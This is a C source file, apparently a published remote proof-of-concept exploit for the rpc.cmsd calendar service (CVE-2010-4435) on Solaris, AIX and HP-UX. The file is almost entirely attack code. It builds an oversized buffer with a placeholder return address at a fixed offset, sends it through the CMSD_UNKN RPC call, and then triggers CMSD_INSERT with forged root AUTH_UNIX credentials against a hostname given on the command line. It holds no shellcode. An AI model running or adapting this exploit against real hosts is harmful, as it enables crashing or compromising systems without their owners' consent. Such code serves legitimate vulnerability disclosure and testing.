/* 
 * Rodrigo Rubira Branco (BSDaemon) - <rodrigo *noSPAM* kernelhacking . com>
 * http://www.kernelhacking.com/rodrigo
 * http://www.risesecurity.org
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rpc/rpc.h>

#define CMSD_PROG 100068
#define CMSD_VERS 4
#define CMSD_INSERT 6 
#define CMSD_UNKN 10 

struct cm_send {
   char *s1;
   char *s2;
};

struct cm_send2 {
   char *s1;
   char *s2;
};

struct cm_reply {
   int i;
};

bool_t xdr_cm_send(XDR *xdrs, struct cm_send *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);

   return (TRUE);
}

bool_t xdr_cm_send2(XDR *xdrs, struct cm_send2 *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);

   return (TRUE);
}

bool_t xdr_cm_reply(XDR *xdrs, struct cm_reply *objp)
{
   if(!xdr_int(xdrs, &objp->i))
      return (FALSE);
   return (TRUE);
}

int
main(int argc, char *argv[])
{
   char buf[2048], buf2[256];
   long ret, offset;
   int len, x, y, i;
   char *hostname, *b;

   CLIENT *cl;
   struct cm_send send;
   struct cm_send2 send2;
   struct cm_reply reply;
   struct timeval tm = { 10, 0 };
   enum clnt_stat stat;

   printf("<< rpc.cmsd remote PoC (CVE-2010-4435), tested against Solaris, AIX, HP-UX >>\n");
   printf("<< Rodrigo Rubira Branco (BSDaemon) - <rodrigo *noSPAM* kernelhacking.com> >>\n");
   printf("<< http://www.kernelhacking.com/rodrigo >>\n");
   printf("<< http://www.risesecurity.org >>\n");

   if(argc < 2) {
      printf("Usage: %s [hostname]\n", argv[0]);
      exit(1);
   } 

   hostname = argv[1];

   memset(buf,0x60,sizeof(buf)-1);
   memset(buf2,0x44,sizeof(buf2)-1);
   memcpy(buf+292,"\xaa\xbb\xcc\xdd",4);

   send.s1 = buf;
   send.s2 = "";
   send2.s1 = buf2;
   send2.s2 = "";

   printf("\nSending CMSD_UNKN to the server ... ");

   if(!(cl=clnt_create(hostname,CMSD_PROG,CMSD_VERS,"udp"))){
        clnt_pcreateerror("\nerror");exit(-1);
   }
   stat=clnt_call(cl, CMSD_UNKN, xdr_cm_send, (caddr_t) &send,
                        xdr_cm_reply, (caddr_t) &reply, tm);

   clnt_destroy(cl);
   
   printf("done!\n");

   printf("Sending CMSD_INSERT procedure ... ");  

   if(!(cl=clnt_create(hostname,CMSD_PROG,CMSD_VERS,"udp"))){
	clnt_pcreateerror("\nerror");exit(-1);
   }

   cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
   stat=clnt_call(cl, CMSD_INSERT, xdr_cm_send2, (caddr_t) &send2,
                        xdr_cm_reply, (caddr_t) &reply, tm);

   printf("done!\n");
   clnt_destroy(cl);

}